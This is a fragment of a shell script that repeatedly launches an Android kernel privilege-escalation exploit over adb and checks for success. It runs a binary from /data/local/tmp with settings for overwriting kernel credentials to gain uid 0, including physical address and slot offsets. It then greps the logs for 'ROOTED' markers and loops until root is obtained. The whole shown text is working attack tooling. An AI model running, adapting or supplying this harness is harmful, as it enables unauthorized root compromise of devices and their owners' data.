...
for n in $(seq 1 $MAX); do
  ...
  MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "chmod 755 /data/local/tmp/$B; rm -f /data/local/tmp/ROOTED /data/local/tmp/uid0_id.txt /data/local/tmp/ROOTED_ID.txt /data/local/tmp/child_uid.txt /data/local/tmp/uid0_go; cd /data/local/tmp; nohup sh -c 'timeout 240 env MODE4_ONLY=1 MODE4_SLIDE_CRED=1 MODE4_CRED_INITTASK=1 UID0_DIRECT=1 UID0_PREFER_CHILD=1 UID0_QUIET_CHILD=1 UID0_PUR_SPIN=1 UID0_DOUBLE_PUNCH=1 UID0_STAGE2_CANARY=1 UID0_SLOT=0x778 KPHYS=0xa8000000 CORE_SEL=7 GHOSTLOCK_LIVE_SYNC=/sdcard/ghostlock/aarif/live_sync.log GHOSTLOCK_STAGE=/sdcard/ghostlock/aarif/stage.txt GHOSTLOCK_PROOF=/sdcard/ghostlock/aarif/proof.log /data/local/tmp/$B' > /data/local/tmp/$L.txt 2>&1 &" >/dev/null 2>&1
  ...
  R=$(MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "grep -a 'comm_landed\|DOUBLE stage2 result\|ROOTED' /data/local/tmp/$L.txt 2>/dev/null | tail -4; cat /data/local/tmp/ROOTED_ID /data/local/tmp/ROOTED 2>/dev/null; cut -d. -f1 /proc/uptime" 2>/dev/null | tr -d '\r')
  echo "roll$n RESULT: $R" >> $OUT
  echo "$R" | grep -qE "ROOTED_ID|WALK (STORES|NO-STORE)" && { echo "roll$n: *** ROOTED ***" >> $OUT; break; }
